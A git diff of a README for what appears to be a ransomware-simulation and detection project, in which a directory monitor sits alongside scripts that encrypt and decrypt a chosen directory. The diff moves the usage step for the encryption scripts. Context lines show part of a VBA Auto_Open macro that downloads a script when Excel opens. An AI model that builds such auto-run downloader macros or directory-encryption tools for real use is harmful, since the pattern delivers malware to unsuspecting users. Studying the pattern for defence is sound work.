@@ -21,7 +21,7 @@ Additionally, an **Excel Macro** with VBA scripting is included to automatically
 
 2. **VBA Macros** - Enabled in Excel to run the provided VBA script.
 
-### Installation Steps
+### Installation/Usage Steps
 
 1. **Install Python Libraries**
 
@@ -34,6 +34,10 @@ Additionally, an **Excel Macro** with VBA scripting is included to automatically
 2. **Set Up Directory Monitoring Script**
 
    In the `monitor_script.py`, specify the directory you want to monitor for suspicious activity. Modify the directory path in the script if needed.
+
+3. **Utilizing the Encryption and Decryption Scripts**
+
+   In `encryption_script.py` and `decryption_script.py`, specify the directory you want to encrypt/decrypt. Modify the directory path in the script if needed.
 
 ---
 
@@ -87,7 +91,3 @@ Sub Auto_Open()
         MsgBox "Failed to download the script. Status: " & http.Status
     End If
 End Sub
-
-3. **Utilizing the Encryption and Decryption Scripts**
-
-   In `encryption_script.py` and `decryption_script.py`, specify the directory you want to encrypt/decrypt. Modify the directory path in the script if needed.
